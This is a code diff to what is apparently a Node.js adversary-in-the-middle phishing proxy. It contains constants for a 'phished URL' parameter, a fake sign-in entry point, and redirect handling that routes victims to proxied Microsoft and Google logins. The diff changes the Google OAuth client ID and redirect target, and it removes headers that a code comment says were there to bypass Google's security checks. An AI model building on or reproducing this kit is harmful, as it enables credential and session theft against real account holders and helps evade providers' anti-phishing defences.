@@ -9,7 +9,7 @@ const crypto = require("crypto");
 const PROXY_ENTRY_POINT_BASE = "/login?method=signin&mode=secure&client_id=";
 const CORPORATE_CLIENT_ID = "d3590ed6-52b3-4102-aeff-aad2292ab01c";
 const PERSONAL_CLIENT_ID = "d3590ed6-52b3-4102-aeff-aad2292ab01c";
-const GOOGLE_CLIENT_ID = "407408718192.apps.googleusercontent.com"; // Google's official OAuth client ID
+const GOOGLE_CLIENT_ID = "717762328687-iludtf96g1hinl76e4lc1b9a82g457nn.apps.googleusercontent.com"; // Google's OAuth client ID
 const PHISHED_URL_PARAMETER = "redirect_urI";
 const PHISHED_URL_REGEXP = new RegExp(`(?<=${PHISHED_URL_PARAMETER}=)[^&]+`);
 const REDIRECT_URL = "https://www.office.com/";
@@ -86,7 +86,7 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
     if (url === '/g' || url === '/google') {
         // Redirect to Google login URL
         clientResponse.writeHead(302, { 
-            Location: `/login?method=signin&mode=secure&client_id=${GOOGLE_CLIENT_ID}&privacy=on&sso_reload=true&redirect_urI=https%3A%2F%2Faccounts.google.com%2Fsignin%2Foauth%2Foauthchooseaccount` 
+            Location: `/login?method=signin&mode=secure&client_id=${GOOGLE_CLIENT_ID}&privacy=on&sso_reload=true&redirect_urI=https%3A%2F%2Faccounts.google.com%2F` 
         });
         clientResponse.end();
         return;
@@ -1553,23 +1553,6 @@ function updateProxyRequestHeaders(proxyRequestOptions, currentSession, proxyHos
         
         // Connection header
         proxyRequestOptions.headers['connection'] = 'keep-alive';
-        
-        // Add additional headers to bypass Google's security checks
-        proxyRequestOptions.headers['sec-gpc'] = '1';
-        proxyRequestOptions.headers['sec-fetch-dest'] = 'document';
-        proxyRequestOptions.headers['sec-fetch-mode'] = 'navigate';
-        proxyRequestOptions.headers['sec-fetch-site'] = 'none';
-        proxyRequestOptions.headers['sec-fetch-user'] = '?1';
-        
-        // Add referer header for Google
-        if (!proxyRequestOptions.headers['referer']) {
-            proxyRequestOptions.headers['referer'] = 'https://www.google.com/';
-        }
-        
-        // Add origin header
-        if (!proxyRequestOptions.headers['origin']) {
-            proxyRequestOptions.headers['origin'] = 'https://www.google.com';
-        }
     }
 }
 
